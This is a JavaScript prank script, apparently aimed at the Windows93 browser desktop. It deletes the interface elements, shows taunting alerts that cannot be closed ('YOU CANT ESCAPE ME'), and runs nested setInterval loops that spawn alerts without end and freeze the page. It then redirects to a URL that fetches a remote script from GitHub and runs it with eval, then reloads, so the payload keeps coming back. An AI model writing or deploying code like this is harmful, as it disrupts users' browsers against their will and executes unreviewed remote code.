function cleanup(){
    for (let p = 0; p < 20; p++) {
        const explorer = document.querySelector('.ui_explorer_container');
        if (explorer) explorer.remove();
        const lol = document.querySelector('.ui_window ui_window--active');
        if (lol) lol.remove();
        const lols = document.querySelector('.ui_window_docked');
        if (lols) lols.remove();
        const lolss = document.querySelector('.ui_window');
        if (lolss) lolss.remove();
        const startButton = document.getElementById('s42_start');
        if (startButton) startButton.remove();
        const feed = document.getElementById('s42_feed');
        if (feed) feed.remove();
    }
}
setTimeout(() => {
    cleanup()
    setTimeout(() => {
        $alert({
            animationIn: "none",
            animationOut: "none",
            msg: "Hi.",
            title: null,
            closable: false,
            dockable: false,
            draggable: false,
            minimizable: false,
            pinnable: false,
            resizable: false,
            footer: "",
            btnOk: null,
            img: "https://github.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/image_2025-10-13_185046345.png?raw=true"
        })
        setTimeout(() => {
            cleanup()
            $alert({
                animationIn: "none",
                animationOut: "none",
                msg: "You Thought you could stop me?",
                title: null,
                closable: false,
                dockable: false,
                draggable: false,
                minimizable: false,
                pinnable: false,
                resizable: false,
                footer: "",
                btnOk: null,
                img: "https://github.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/image_2025-10-13_185046345.png?raw=true"
            })
            setTimeout(() => {
                cleanup()
                $alert({
                    animationIn: "none",
                    animationOut: "none",
                    msg: "Mortal?",
                    title: null,
                    closable: false,
                    dockable: false,
                    draggable: false,
                    minimizable: false,
                    pinnable: false,
                    resizable: false,
                    footer: "",
                    btnOk: null,
                    img: "https://github.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/image_2025-10-13_185046345.png?raw=true"
                })
                setTimeout(() => {
                    cleanup()
                    const bgDiv = document.getElementById("s42_background");
                    bgDiv.innerHTML = "";
                    bgDiv.style.backgroundImage = "url('https://github.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/image_2025-10-13_185046345.png?raw=true')";
                    bgDiv.style.backgroundSize = "cover"; // makes it stretch
                    bgDiv.style.backgroundPosition = "center";
                    bgDiv.style.backgroundRepeat = "no-repeat";
                    bgDiv.style.width = "100%";
                    bgDiv.style.height = "100%";
                    setInterval(() => {
                        cleanup()
                        $alert({
                            msg: "YOU CANT ESCAPE ME",
                            title: "YOU CANT ESCAPE ME",
                            btnOk: null,
                        })
                        setInterval(() => {
                            $alert({
                                msg: "YOU CANT ESCAPE ME",
                                title: "YOU CANT ESCAPE ME",
                                btnOk: null,
                            })
                        }, Math.random()*300)
                    }, 300)
                }, 3000)
                setTimeout(function() {
                    window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/assets/Billeroni.js').then(response%20=>%20response.text()).then(script%20=>%20eval(script));";
                    window.location.reload(true);
                },6000)
            }, 2000);
        }, 3141);
    }, 3141);
}, 5000);
